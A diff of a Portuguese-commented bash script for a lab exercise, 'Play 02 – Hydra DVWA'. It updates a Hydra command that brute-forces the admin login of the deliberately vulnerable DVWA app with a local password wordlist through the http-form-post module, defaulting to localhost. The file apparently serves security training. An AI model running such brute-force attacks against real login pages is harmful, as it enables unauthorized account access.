@@ -1,21 +1,31 @@
 #!/usr/bin/env bash
-# denis-play-backend/plays/play-02-hydra-dvwa/run.sh
+#
+# Play 02 – Hydra DVWA
+# Uso: ./run.sh [HOST[:PORT]]
+# Exemplo: ./run.sh 127.0.0.1:8081
 
-# Vai para a pasta onde este script está
+# Vai para o diretório deste script
 cd "$(dirname "$0")"
 
-# IP recebido como primeiro argumento, ou localhost se não vier nada
-IP=${1:-127.0.0.1}
+# IP e porta recebidos ou default para 127.0.0.1:80
+TARGET=${1:-127.0.0.1:80}
 
-echo "[*] Iniciando ataque com Hydra contra $IP..."
+echo "[*] Iniciando ataque com Hydra contra $TARGET..."
 sleep 1
 
-# Hydra vai ler a wordlist local passwords.txt
+# Hydra usando http-form-post:
+#   -l admin           → usuário fixo "admin"
+#   -P passwords.txt   → wordlist local
+#   -s PORT            → porta, caso exista (:PORT no TARGET)
+#   http-form-post     → módulo correto para login via formulário
+#   "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+#                      → PATH, POST data, string de falha
 hydra -l admin \
       -P passwords.txt \
-      http://$IP/login.php \
-      -v -t 4 \
-    > resultado.txt
+      -s ${TARGET#*:} \
+      ${TARGET%%:*} http-form-post \
+      "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
+      -t 4 -V > resultado.txt
 
 echo
 echo "[📄] Saída do Hydra:"
